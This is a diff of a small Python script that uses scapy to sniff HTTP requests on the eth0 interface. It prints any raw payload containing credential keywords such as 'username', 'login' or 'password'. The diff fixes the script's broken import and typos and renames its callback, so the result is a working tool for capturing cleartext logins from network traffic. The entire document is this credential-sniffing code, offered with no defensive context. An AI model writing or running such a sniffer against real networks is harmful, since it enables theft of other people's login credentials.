@@ -1,22 +1,19 @@
 #!/usr/bin/env python
 
-import scapy.ass as scapy
+import scapy.all as scapy
 from scapy.layers import http
 
 def sniff(interface):
-    scapy.sniff(iface=interface,store=False,prn=process_sniff_packet) 
-    
-def process_sniff_packet(packet):
+    scapy.sniff(iface=interface, store=False, prn=packet_sniff)
+
+def packet_sniff(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw): 
-           load = packet[scapy.Raw].load ## create a variable name
-           keywords = ["username", "user", "login", "passowrd","pass"] ## this is a create a list for keywords interesting stuff
-           for keyword in keywords: ## this is a create a list
-              if keyword in load:
-                  print(load)
-                  break ## this is a break the statement do not repeat the statement. of keywords.only execution the if username in keywords
-               
-          # if "username" in load:
-              # print(load) ## this is a print the load for keyword username
-         
-sniff("eth0") 
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load  ## this is use for scapy layer for raw layer
+            keywords = ["username", "user", "login", "password", "pass"]
+            for keyword in keywords:  # Changed from 'keywords' to 'keyword'
+                if keyword in load:
+                    print(load)
+                    break
+
+sniff("eth0")
